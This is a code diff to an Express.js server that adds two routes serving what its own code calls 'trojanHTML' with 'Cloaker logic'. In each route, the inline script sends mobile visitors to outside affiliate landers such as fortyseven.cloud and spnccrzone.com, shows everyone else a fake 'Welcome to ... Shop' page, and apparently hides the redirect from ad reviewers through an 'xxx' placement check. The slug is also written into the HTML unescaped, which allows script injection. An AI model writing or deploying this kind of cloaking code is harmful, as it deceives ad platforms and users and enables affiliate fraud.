@@ -565,8 +565,71 @@ app.get('/api/shein/v2/cvr', async (req, res) => {
 
 
 
+// Middleware to pass on Jay's SubIDs SHEIN
+app.get('/jshein/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://fortyseven.cloud/jshein.html?sub=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twshein Trojan (tyler)(${slug})`);
+});
 
-
+// Middleware to pass on Jay's SubIDs SHEIN D2O
+app.get('/jsheindir/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://spnccrzone.com/?es4v=FmyY4d6G0qOaPQMadpgCByOsBcl9sIUSvQJDRoz7h5U%3d&s1=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twshein Trojan (tyler)(${slug})`);
+});
 
 // Middleware to pass on Tyler's SubIDs MY LANDER
 app.get('/twshein/:slug', (req, res, next) => {
